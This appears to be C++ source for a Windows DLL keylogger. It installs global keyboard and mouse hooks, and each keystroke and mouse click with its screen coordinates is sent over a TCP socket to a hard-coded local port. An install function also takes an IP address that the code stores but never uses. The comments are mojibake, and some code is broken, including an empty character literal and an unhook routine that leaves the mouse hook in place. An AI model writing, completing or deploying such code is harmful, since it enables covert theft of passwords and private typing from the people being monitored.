#include <iostream>

#include <winsock2.h>

#include <windows.h>
#include <windef.h>
#include <stdio.h>
#include <cstring>

#include "RequestCode.h"

HHOOK g_hHook = NULL;
HHOOK g_MHook = NULL;
HINSTANCE g_hInst = NULL;

char IP[20];

using namespace std;

BOOL WINAPI
DllMain(HINSTANCE hInst, DWORD reason, LPVOID /* reserved */)
{
     g_hInst = hInst;
     // ������ ������ ���� �ʴ´�.
     if(reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hInst);
     return TRUE;
}
bool
sendTCP(const char* data)
{

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    ZeroMemory(&server, sizeof(server));

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        return false;
    }

    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        WSACleanup();
        return false;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 750 );


    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        closesocket(s);
        WSACleanup();
        if(WSAGetLastError())
        {
            return false;
        }
        return false;
    }

    send(s, data, strlen(data), 0);
    closesocket(s);
    WSACleanup();

    return true;
}

// Ű���� ��ŷ ���ν���
LRESULT CALLBACK
KeyHook(int code, WPARAM w, LPARAM l)
{
    char temp=w;
    char buf[50]="";

    if(code >= 0)
    {
        if(!(l & 0x80000000))
        {
            sprintf(buf, "%c", temp);
            sendTCP(buf);
        }
        else if(l & 0x80000000) // key release
        {
            switch(temp)
            {

            case '' :
                sprintf(buf, "[/Shift]");
                sendTCP(buf);
                break;
            }
        }

    }
    return CallNextHookEx(g_hHook, code, w, l);
}
// ���콺 ��ŷ ���ν���
LRESULT CALLBACK
MouseHook(int code, WPARAM w, LPARAM l) {

    if(code >= HC_ACTION)
    {
        if(w == WM_LBUTTONDOWN)
        {
            char buf[50]="";
            sprintf(buf, "\nLeft butt Pressed: %u, %u\n", LOWORD(l), HIWORD(l));
            sendTCP(buf);
        }
        if(w == WM_RBUTTONDOWN)
        {
            char buf[50]="";
            sprintf(buf, "\nRight butt Pressed: %u, %u\n", LOWORD(l), HIWORD(l));
            sendTCP(buf);
        }
    }
    return CallNextHookEx(g_MHook, code, w, l);
}
// �� ���ν��� ��ġ
extern "C" BOOL WINAPI
InstallHook(char IP_P[20])
{
    BOOL ret = FALSE;
    if(!g_hHook)
    {
        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyHook, g_hInst, 0);
        g_MHook = SetWindowsHookEx(WH_MOUSE, MouseHook, g_hInst, 0);
        if(g_hHook && g_MHook)
            ret = TRUE;
    }
    strcpy(IP, IP_P);
    return ret;
}
// �� ���ν��� ����
extern "C" BOOL WINAPI
UninstallHook()
{
     BOOL ret = FALSE;
     if(g_hHook)
     {
         ret = UnhookWindowsHookEx(g_hHook);
         if(ret)
            g_hHook = NULL;
     }
     return ret;
}
